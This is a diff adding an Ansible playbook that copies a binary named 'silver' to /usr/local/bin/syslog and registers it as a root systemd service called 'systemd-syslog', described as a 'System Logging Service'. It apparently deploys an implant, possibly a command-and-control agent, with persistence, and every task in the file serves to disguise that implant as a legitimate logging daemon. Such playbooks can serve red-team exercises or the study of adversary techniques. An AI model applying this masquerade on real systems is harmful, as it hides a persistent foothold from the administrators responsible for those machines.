@@ -1,0 +1,38 @@
+---
+- name: Copy silver binary
+  ansible.builtin.copy:
+    src: silver
+    dest: /usr/local/bin/syslog
+    owner: root
+    group: root
+    mode: "0755"
+
+- name: Create systemd service unit
+  ansible.builtin.copy:
+    dest: /usr/lib/systemd/system/systemd-syslog.service
+    owner: root
+    group: root
+    mode: "0644"
+    content: |
+      [Unit]
+      Description=System Logging Service
+      After=network.target
+
+      [Service]
+      Type=simple
+      ExecStart=/usr/local/bin/syslog
+      Restart=on-failure
+      RestartSec=5
+
+      [Install]
+      WantedBy=multi-user.target
+
+- name: Reload systemd daemon
+  ansible.builtin.systemd:
+    daemon_reload: yes
+
+- name: Enable and start wrapper service
+  ansible.builtin.systemd:
+    name: systemd-syslog
+    enabled: yes
+    state: started
